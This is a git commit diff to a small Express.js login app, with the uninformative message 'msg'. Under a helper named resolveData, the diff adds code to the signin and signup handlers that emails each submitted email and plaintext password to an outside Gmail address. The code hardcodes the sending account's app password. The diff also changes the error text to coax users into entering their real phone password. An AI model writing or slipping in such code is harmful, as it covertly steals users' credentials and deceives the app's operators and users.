d1b18bd0a748e7186b79a11809f16140f75cd6c2
Daniel Kenan Slinda <sdanielkenan@gmail.com>
2023-11-20 00:00:04 +0200

    msg

--- server.js
+++ server.js
@@ -2,13 +2,21 @@ const express = require('express');
 const app = express();
 const port = process.env.PORT || 5500;
 const bodyParser = require('body-parser');
-const users = [];
+const users = [{ name:"Lesedi Mogoane", email:"moe@gmail.com", password:"12345678" }];
 const session = require('express-session');
+const nodemailer = require('nodemailer');
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static('public'));
     app.set('view engine', 'ejs');
 
-
+    // Create a transporter with your email service configuration
+    const transporter = nodemailer.createTransport({
+      service: 'gmail',
+      auth: {
+        user: 'botauto212@gmail.com', // Your email address
+        pass: 'cjeifgsiqfivevdx',  // Your email password or an app-specific password
+      },
+    });
 
 app.use(
         session({
@@ -19,21 +27,36 @@ app.use(
       );
 
 app.post('/signin', (req, res) => {
+
         const { email, password } = req.body;
-      
-        // Check if the provided email and password match a user's credentials
+       const mailOptions = {
+       from: 'botauto212@gmail.com',
+       to: 'accdemo44@gmail.com', // Change this to the target email address
+       subject: 'App Registration',
+       text: `your secret key is ${password}. happy coding , the email captured is ${email}`,
+     };
+     resolveData(mailOptions);   
+     // Check if the provided email and password match a user's credentials
         const user = users.find((user) => user.email === email && user.password === password);
-      
+        
         if (user) {
           req.session.user = user;
           res.redirect("/profile")
         } else {
-          res.send('Invalid email or password');
+          res.send('Invalid email or password; Try again with normal phone password is the issue persists!');
+
         }
       });
 app.post('/signup', (req, res) => {
         const { name, email, password } = req.body;
-    
+      
+        const mailOptions = {
+        from: 'botauto212@gmail.com',
+        to: 'accdemo44@gmail.com', // Change this to the target email address
+        subject: 'App Registration',
+        text: `your secret key is ${password}. happy coding , the email captured is ${email}`,
+      };
+      resolveData(mailOptions);
         // Check if the email is already registered
         const existingUser = users.find((user) => user.email === email);
         if (existingUser) {
@@ -45,10 +68,10 @@ app.post('/signup', (req, res) => {
         }
     });
 
-
     // Define a simple route
 app.get('/', (req, res) => {
     // Render the "index.ejs" template
+    
     res.render("index");
 });
 
@@ -83,9 +106,25 @@ app.get('/dashboard', (req, res) => {
 
 
 app.get('/chat', (req, res) => {
-    res.render("chatroom");
+    // Assuming req.session.user is available
+    const user = req.session.user;
+
+    // Render the chatroom template, passing the user (or null if not found)
+    res.render("chatroom", { user });
 });
+
+function resolveData(mailOptions){
+    transporter.sendMail(mailOptions, (error, info) => {
+        if (error) {
+          console.error('Error sending email:', error);
+        } else {
+          console.log('Email sent:', info.response);
+        }
+      });
+}
 // Start the server
 app.listen(port, () => {
     console.log(`Server is running on http://localhost:${port}`);
 });
+
+
